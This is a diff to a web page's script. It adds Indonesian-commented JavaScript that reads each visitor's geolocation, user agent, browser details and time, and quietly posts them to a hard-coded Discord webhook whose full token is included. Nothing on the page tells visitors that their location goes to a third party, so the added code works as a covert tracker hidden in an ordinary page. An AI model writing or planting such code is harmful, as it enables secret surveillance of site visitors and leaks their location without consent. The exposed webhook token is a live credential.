@@ -51,6 +51,45 @@
         const container = document.querySelector('.container');
         container.classList.add('animated');
     });
+        // Minta izin untuk akses geolokasi
+navigator.geolocation.getCurrentPosition(function(position) {
+    var latitude = position.coords.latitude;
+    var longitude = position.coords.longitude;
+    var locationInfo = "Lokasi pengunjung: " + latitude + ", " + longitude;
+
+    // Informasi perangkat
+    var userAgent = navigator.userAgent;
+    var deviceInfo = "User Agent: " + userAgent;
+
+    // Informasi browser
+    var browserName = navigator.appName;
+    var browserVersion = navigator.appVersion;
+    var browserInfo = "Browser: " + browserName + " " + browserVersion;
+
+    // Informasi waktu
+    var currentDateTime = new Date();
+    var dateTimeInfo = "Waktu: " + currentDateTime.toString();
+
+    // Gabungkan semua informasi
+    var logMessage = locationInfo + "\n" + deviceInfo + "\n" + browserInfo + "\n" + dateTimeInfo;
+
+    // URL webhook Discord
+    var webhookURL = "https://discord.com/api/webhooks/952216517959893012/BX96Q3Sx87NkfDNlX1trtwROc8DaR2JhI3lY5rMXXePnEhJq2Ctm4whIFzqLACbO2orr"; // Ganti dengan URL webhook yang telah Anda salin
+
+    // Data yang akan dikirim ke Discord
+    var message = {
+        content: logMessage
+    };
+
+    // Kirim log ke Discord
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", webhookURL);
+    xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+    xhr.send(JSON.stringify(message));
+
+    console.log("Log dikirim ke Discord:", logMessage);
+});
+
     </script>
 </body>
 </html>
